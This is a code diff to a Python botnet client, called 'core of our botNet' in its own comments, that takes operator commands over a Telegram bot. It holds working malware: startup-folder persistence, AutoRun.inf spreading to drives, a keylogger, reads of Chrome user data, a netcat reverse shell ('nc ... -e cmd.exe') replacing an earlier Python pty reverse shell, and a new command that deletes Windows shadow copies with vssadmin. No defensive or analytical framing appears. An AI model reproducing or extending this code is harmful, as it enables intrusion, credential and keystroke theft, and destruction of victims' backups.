@@ -13,8 +13,10 @@ from bs4 import BeautifulSoup
 from pynput.keyboard import Listener
 from getpass import getuser
 
-
 # TODO this is core of our botNet and not complete yet
+
+admin = "0000000000"  # add admin id here
+token = "111111:XXXXXXX"  # add token here
 
 
 def start_up():
@@ -24,7 +26,7 @@ def start_up():
     """
     if platform.system() == "Windows":  # TODO test codes on windows!
         user = node()
-        user = user.replace("-PC", "")
+        user = user.replace("-PC", "")  # TODO test getuser() on windows and replace it with this
         power = r'copy info.exe "C:\Users\"' + str(user) + '"\\AppData\\Roaming\\Microsoft\\Windows\\Start ' \
                                                            'Menu\\Programs\\Startup\\" '
         system(power)
@@ -44,6 +46,12 @@ def auto_copy():  # TODO test codes on windows!
             system(cmd)
             cmd = "copy AutoRun.inf " + str(i) + ":"
             system(cmd)
+
+
+def backup_cleaner():  # TODO test it
+    if platform.system() == "Windows":
+        command = "vssadmin delete shadows /all /quiet"
+        system(command)
 
 
 def getting_func():
@@ -123,8 +131,6 @@ if __name__ == "__main__":
     info = info[0:3] + info[4:]
     start_up()
     auto_copy()
-    admin = "0000000000"      # add admin id here
-    token = "111111:XXXXXXX"  # add token here
     while True:
         finalResult = getting_func()
         data = loads(finalResult)["result"][-1]["message"]["text"]
@@ -157,25 +163,21 @@ if __name__ == "__main__":
                 key_logger(log_dir)
             else:
                 user = node()
-                user = user.replace("-PC", "")
+                user = user.replace("-PC", "")  # TODO test getuser() on windows and replace it with this
                 log_dir = "c:/Users/" + str(user) + "/Documents/"
                 key_logger(log_dir)
-        elif data[0:12] == "/backConnect" and admin == sender:  # TODO handle errors & add this for windows
+        elif data[0:12] == "/backConnect" and admin == sender:  # TODO test it & handle errors
+            ip = data[13:].split(":")[0]
+            port = data[13:].split(":")[1]
             if platform.system() == "Linux":
-                ip = data[13:].split(":")[0]
-                port = data[13:].split(":")[1]
-                command = "export RHOST = " + ip + ";export RPORT = " + port + ";python -c " + 'import sys,socket,os,' \
-                                                                                               'pty;s=socket.socket(' \
-                                                                                               ');s.connect((' \
-                                                                                               'os.getenv("RHOST"),' \
-                                                                                               'int(os.getenv(' \
-                                                                                               '"RPORT"))));[os.dup2(' \
-                                                                                               's.fileno(),' \
-                                                                                               'fd) for fd in (0,1,' \
-                                                                                               '2)];pty.spawn(' \
-                                                                                               '"/bin/sh") '
+                command = "nc " + ip + " " + port
                 system(command)
-                message = str(info) + "_res=running"
+                message = str(info) + "_res=nc_is_now_running"
+                message_func(message, sender)
+            else:
+                command = "cd C:/ | nc " + ip + " " + port + " -e cmd.exe"
+                system(command)
+                message = str(info) + "_res=nc_is_now_running"
                 message_func(message, sender)
         elif data[0:10] == "/clearPass" and admin == sender:  # TODO add browser password cleaner, first fix it!!!
             if platform.system() == "Linux":
@@ -198,7 +200,7 @@ if __name__ == "__main__":
                     message_func(message, sender)
             else:
                 user = node()
-                user = user.replace("-PC", "")
+                user = user.replace("-PC", "")  # TODO test getuser() on windows and replace it with this
                 command = "dir C:\\Users\\" + str(user) + "\\AppData\\Local\\Google\\Chrome\\User Data\\"
                 res = str(check_output(command, shell=True))[2:-1]
                 message = str(info) + "_res=" + res
@@ -221,7 +223,7 @@ if __name__ == "__main__":
             else:
                 try:
                     user = node()
-                    user = user.replace("-PC", "")
+                    user = user.replace("-PC", "")  # TODO test getuser() on windows and replace it with this
                     command = "more /" + str(user) + "/Documents/klg.txt"
                     res = str(check_output(command, shell=True))[2:-1]
                     message = str(info) + "_keys=" + res
@@ -259,6 +261,10 @@ if __name__ == "__main__":
                 res = check_output(command, shell=True)
                 message = str(info) + "_res=" + str(res) + "_ok"
                 message_func(message, sender)
+        elif data[0:13] == "/clearBackups" and admin == sender:
+            backup_cleaner()
+            message = str(info) + "_res=backups_cleaned"
+            message_func(message, sender)
         sleep(6)
 
 # TODO add virus behavior to clone
